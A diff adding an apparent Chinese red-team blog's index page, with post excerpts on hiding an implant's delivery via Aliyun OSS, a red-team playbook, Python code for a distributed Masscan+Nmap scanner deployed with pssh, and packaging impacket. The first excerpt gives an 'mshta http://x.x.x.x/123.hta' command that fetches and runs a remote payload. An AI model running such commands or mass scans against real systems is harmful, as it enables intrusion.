@@ -1,0 +1,1851 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Security Vulnerability">
+<meta name="keywords" content="YoungRichOG">
+<meta property="og:type" content="website">
+<meta property="og:title" content="YoungRichOG">
+<meta property="og:url" content="http://yoursite.com/page/2/index.html">
+<meta property="og:site_name" content="YoungRichOG">
+<meta property="og:description" content="Security Vulnerability">
+<meta property="og:locale" content="zh-Hans">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="YoungRichOG">
+<meta name="twitter:description" content="Security Vulnerability">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/page/2/">
+
+
+
+
+
+  <title>YoungRichOG</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left 
+  page-home">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">YoungRichOG</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">Web Pentester</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+  <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/11/23/巧用OSS对抗记/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="YoungRichOG">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="YoungRichOG">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/11/23/巧用OSS对抗记/" itemprop="url">巧用OSS对抗记</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-11-23T22:55:20+08:00">
+                2020-11-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h1 id="巧用OSS对抗记"><a href="#巧用OSS对抗记" class="headerlink" title="巧用OSS对抗记"></a>巧用OSS对抗记</h1><p><strong><del>转载请注明出处：<a href="https://youngrichog.github.io/" target="_blank" rel="noopener">https://youngrichog.github.io/</a></del></strong></p>
+<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>在某次红蓝对抗中，发现自己的小马被防守方获取到，由此开始想招对抗防守方。主要场景是我使用mshta <a href="http://x.x.x.x/123.hta" target="_blank" rel="noopener">http://x.x.x.x/123.hta</a> 进行远程命令执行，但是由于环境所困没办法使用https，害怕由于使用https出现”此网站的安全证书存在问题”，需要受害者二次点击影响效果。</p>
+<p>后续对风险面分析，我的小马会释放一个hta到本地，然后在mshta本地hta，为什么要这样做？缘由是这样的，如果通过mshta直接进行远程文件的下载是会出现<strong>跨域同源策略</strong>的问题，当然通过命令下载(bitsadmin、certutil···等等)，也是为了避免去使用命令下载才使用编写XMLHTTP Request进行下载。所以我通过scripting.filesystemobject又写了一个hta到本地，继续mshta本地hta文件，这样就可以把上述问题解决。我也期待有其他解决方案，希望大家可以一起交流 :-)</p>
+<p>回到重点，想在网络上将隐藏的好一些，那么如何能不弹”此网站的安全证书存在问题”?后来大佬说OSS可以，然后我就去对OSS进行了解，发现<strong>镜像回源</strong>的功能可以实现，当然直接文件丢OSS任何人都可以下载，最终利用该功能配合脚本解决。</p>
+<p>这里的OSS指的是阿里云-对象存储OSS</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2020/11/23/巧用OSS对抗记/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/08/30/HW红队攻击方案/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="YoungRichOG">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="YoungRichOG">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/08/30/HW红队攻击方案/" itemprop="url">HW红队攻击方案</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-08-30T21:10:36+08:00">
+                2020-08-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h1 id="HW红队攻击方案"><a href="#HW红队攻击方案" class="headerlink" title="HW红队攻击方案"></a>HW红队攻击方案</h1><p><strong><del>转载请注明出处：<a href="https://youngrichog.github.io/" target="_blank" rel="noopener">https://youngrichog.github.io/</a></del><em>**</em></strong></p>
+<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>HW行动近些年关注度持续提升，站在攻击方的角度，我们应该如何完成HW任务。对标真实战争的红方和蓝方，指挥部都会有对应的作战手册，例如：美国海军陆战队。那么回到HW中的红队，我们也应该有相应的作战手册，一个完整的作战手册可以让队伍有序战斗，可以有效提高队伍的攻击效率。因此作战手册尤为重要。</p>
+<p>HW防守方目标众多，如何对目标进行快速的信息搜集？根据以往的渗透来说，前期的信息搜集是一个非常耗时间的工作，需要人工参与的场景比较多，那么我们就需要思考如果缩短时间，提高效率。</p>
+<p>基础设施建设+作战手册·····</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2020/08/30/HW红队攻击方案/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/08/09/简单分布式Masscan-Nmap/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="YoungRichOG">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="YoungRichOG">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/08/09/简单分布式Masscan-Nmap/" itemprop="url">简单分布式Masscan+Nmap</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-08-09T00:08:21+08:00">
+                2020-08-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="简单分布式Masscan-Nmap"><a href="#简单分布式Masscan-Nmap" class="headerlink" title="简单分布式Masscan+Nmap"></a>简单分布式Masscan+Nmap</h1><p><strong><del>转载请注明出处：<a href="https://youngrichog.github.io/" target="_blank" rel="noopener">https://youngrichog.github.io/</a></del><em>**</em></strong></p>
+<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>主要从如何开始快速部署、扫描来思考，想在几天之内完成十几万台的端口扫描和指纹识别，然后就简简单单造个轮子，后续不停的扩容机器数量</p>
+<p>通过Masscan+Nmap+Redis实现，我们只需要把db:1的数据给丢上去，然后开masscan_agent不断的去取db:0的数据进行端口扫描，nmap_agent不断的去取db:1的数据进行指纹识别</p>
+<p>db:0</p>
+<p>该数据库主要存储待扫描的IP/IP段</p>
+<p>db:1</p>
+<p>该数据主要存储已经扫描完成的ip:port</p>
+<p><img src="/2020/08/09/简单分布式Masscan-Nmap/1.png" alt="img"></p>
+<h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><p>Massscan Agent 代码实现</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> masscan,redis,time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consumer</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">		print(<span class="string">'key:'</span>,r.keys())</span><br><span class="line">		<span class="keyword">if</span> len(r.keys()) &gt;<span class="number">0</span>:</span><br><span class="line">			_key = r.randomkey()</span><br><span class="line">			ip = r.get(_key)</span><br><span class="line">			r.delete(_key)</span><br><span class="line">			status = masscan_plugin(ip)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			print(<span class="string">'[*] 等待中···'</span>)</span><br><span class="line">			time.sleep(<span class="number">60</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">masscan_plugin</span><span class="params">(ip)</span>:</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		mas = masscan.PortScanner()</span><br><span class="line">		mas.scan(ip,ports=<span class="string">'1-65535'</span>,arguments=<span class="string">'-Pn --max-rate=2000'</span>)</span><br><span class="line">		result = mas.scan_result[<span class="string">'scan'</span>]</span><br><span class="line">		<span class="keyword">for</span> key,value <span class="keyword">in</span> result.items():</span><br><span class="line">			_len = len(value[<span class="string">'tcp'</span>].keys())</span><br><span class="line">			<span class="keyword">if</span> _len &lt; <span class="number">50</span>:</span><br><span class="line">        <span class="comment">#过滤超过开了50个端口的ip，因为ids等原因导致</span></span><br><span class="line">				<span class="keyword">for</span> k,kk <span class="keyword">in</span> value[<span class="string">'tcp'</span>].items():</span><br><span class="line">					print(key+<span class="string">':'</span>+str(k),key+<span class="string">':'</span>+str(k))</span><br><span class="line">					rr.set(key+<span class="string">':'</span>+str(k),key+<span class="string">':'</span>+str(k))</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		print(<span class="string">'Masscan Error:'</span>,e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	pool = redis.ConnectionPool(host=<span class="string">'x.x.x.x'</span>,port=<span class="number">6379</span>,password=<span class="string">'xxxxx'</span>,decode_responses=<span class="keyword">True</span>,db=<span class="number">0</span>)</span><br><span class="line">	r = redis.Redis(connection_pool=pool)</span><br><span class="line"></span><br><span class="line">	pool_1 = redis.ConnectionPool(host=<span class="string">'x.x.x.x'</span>,port=<span class="number">6379</span>,password=<span class="string">'xxxxx'</span>,decode_responses=<span class="keyword">True</span>,db=<span class="number">1</span>)</span><br><span class="line">	rr = redis.Redis(connection_pool=pool_1)</span><br><span class="line"></span><br><span class="line">	consumer()</span><br></pre></td></tr></table></figure>
+<p>Nmap Agent 代码实现</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> queue,nmap,threading,redis,time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consumer</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">		<span class="keyword">if</span> len(r.keys()) &gt; <span class="number">0</span>:</span><br><span class="line">			_keys = r.keys()</span><br><span class="line">			_keylist = _keys[:<span class="number">10</span>]</span><br><span class="line">			<span class="keyword">for</span> ip <span class="keyword">in</span> _keylist:</span><br><span class="line">				Queue.put(ip)</span><br><span class="line">				r.delete(ip)</span><br><span class="line">			threadscan()</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			print(<span class="string">'[*] 等待中···'</span>)</span><br><span class="line">			time.sleep(<span class="number">60</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nmap_plugin</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">while</span> <span class="keyword">not</span> Queue.empty():</span><br><span class="line">		_ipport = Queue.get()</span><br><span class="line">		ip = _ipport.split(<span class="string">':'</span>)[<span class="number">0</span>]</span><br><span class="line">		port = _ipport.split(<span class="string">':'</span>)[<span class="number">1</span>]</span><br><span class="line">		nm = nmap.PortScanner()</span><br><span class="line">		print(<span class="string">'[*] 开始扫描:%s,%s'</span> %(ip,port))</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			nm.scan(ip,arguments=<span class="string">'-sV -T4 -Pn --version-all -p&#123;&#125;'</span>.format(port))</span><br><span class="line">			<span class="keyword">with</span> open(<span class="string">'nmap_res.txt'</span>,<span class="string">'a+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">				f.write(nm.csv())</span><br><span class="line">		<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">			print(<span class="string">'[*] Nmap Error:'</span>,e)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">threadscan</span><span class="params">()</span>:</span></span><br><span class="line">	Threads = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">		thread_hi = threading.Thread(target=nmap_plugin)</span><br><span class="line">		thread_hi.start()</span><br><span class="line">		Threads.append(thread_hi)</span><br><span class="line">	<span class="keyword">for</span> t <span class="keyword">in</span> Threads:</span><br><span class="line">		t.join()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	consumer()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	pool = redis.ConnectionPool(host=<span class="string">'x.x.x.x'</span>,port=<span class="number">6379</span>,password=<span class="string">'xxxxx'</span>,decode_responses=<span class="keyword">True</span>,db=<span class="number">1</span>)</span><br><span class="line">	r = redis.Redis(connection_pool=pool)</span><br><span class="line"></span><br><span class="line">	Queue = queue.Queue()</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
+<p>Producer 代码实现</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">producer</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">with</span> open(<span class="string">'iplist.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">		num = <span class="number">0</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">			num += <span class="number">1</span></span><br><span class="line">			print(<span class="string">'Insert:'</span>,num,i.rstrip())</span><br><span class="line">			r.set(num,i.rstrip())</span><br><span class="line">			</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	pool = redis.ConnectionPool(host=<span class="string">'x.x.x.x'</span>,port=<span class="number">6379</span>,password=<span class="string">'xxxxx'</span>,decode_responses=<span class="keyword">True</span>,db=<span class="number">0</span>)</span><br><span class="line">	r = redis.Redis(connection_pool=pool)</span><br><span class="line"></span><br><span class="line">	producer()</span><br></pre></td></tr></table></figure>
+<p>通过pssh我们可以批量ssh执行命令，pscp可以批量上传文件</p>
+<p>pssh遇到公私钥登陆的时候会要选择yes/no，然后加上<strong><em>-O StrictHostKeyChecking=no</em></strong>就可以了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pssh -h iplist.txt -O StrictHostKeyChecking=no -P &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+<p>批量上传</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pscp -h iplist.txt masscanAgent.py /tmp/</span><br></pre></td></tr></table></figure>
+<p>批量执行Agent并挂在后台</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pssh -h iplist.txt -P &quot;screen -dmS &apos;masscanAgent&apos; bash -c &apos;python3 /tmp/masscanAgent.py&apos;&quot;</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/14/pyinstaller打包impacket/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="YoungRichOG">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="YoungRichOG">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/06/14/pyinstaller打包impacket/" itemprop="url">pyinstaller打包impacket</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-14T22:50:11+08:00">
+                2020-06-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="pyinstaller打包impacket"><a href="#pyinstaller打包impacket" class="headerlink" title="pyinstaller打包impacket"></a>pyinstaller打包impacket</h1><p><strong><del>转载请注明出处：<a href="https://youngrichog.github.io/" target="_blank" rel="noopener">https://youngrichog.github.io/</a></del></strong></p>
+<p>记录一下打包遇到的问题</p>
+<p>python打包exe的时候遇到问题,exe已经打包成功但是运行后报”pkg_resources.DistributionNotFound：the “impacket” distribution was not found….”</p>
+<p><img src="/2020/06/14/pyinstaller打包impacket/1.png" alt="img"></p>
+<p>解决方案：<br>在需要打包的根目录下新建hook-ctypes.macholib.py文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PyInstaller.utils.hooks <span class="keyword">import</span> copy_metadata</span><br><span class="line">datas = copy_metadata(<span class="string">'impacket'</span>)</span><br></pre></td></tr></table></figure>
+<p>然后使用下面命令重新打包:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller -F get_env.py --additional-hooks-dir=.</span><br></pre></td></tr></table></figure>
+<h2 id="Respect"><a href="#Respect" class="headerlink" title="Respect"></a>Respect</h2><p><a href="https://github.com/pyinstaller/pyinstaller/issues/1713" target="_blank" rel="noopener">https://github.com/pyinstaller/pyinstaller/issues/1713</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/06/文件上传绕过备忘录/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="YoungRichOG">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="YoungRichOG">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/06/06/文件上传绕过备忘录/" itemprop="url">文件上传绕过备忘录</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-06T11:04:59+08:00">
+                2020-06-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="文件上传绕过备忘录"><a href="#文件上传绕过备忘录" class="headerlink" title="文件上传绕过备忘录"></a>文件上传绕过备忘录</h1><p><strong><del>转载请注明出处：<a href="https://youngrichog.github.io/" target="_blank" rel="noopener">https://youngrichog.github.io/</a></del><em>**</em></strong></p>
+<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>好久没有做过渗透测试，闲来无事遇到一个铱迅的WAF，然后记录一下吧，可能是old school的手法，但是我不会，脑子里面没有印象 :-(</p>
